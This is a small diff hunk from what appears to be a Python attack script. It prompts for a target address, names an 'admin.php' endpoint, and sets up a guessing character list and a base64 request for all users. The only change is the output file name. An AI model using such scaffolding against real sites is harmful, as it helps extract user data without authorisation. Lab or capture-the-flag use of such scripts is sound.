@@ -6,7 +6,7 @@ import sys
 in_url = input("ENTER IP AND PORT FOR WEBSITE EXAMPLE: 123.124.533.345:9898 \n")
 url = f"http://{in_url}/"
 post_delete = "admin.php"
-url_result = "blank.html"
+url_result = "users.html"
 list_wordlist=list("abcdefghijklmnopqrstuvwxyz0123456789,ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*{}();")
 encoded_data_get = {
     "data":"eyJyZXF1ZXN0TWV0aG9kIjoiZ2V0QWxsVXNlcnMifQ=="
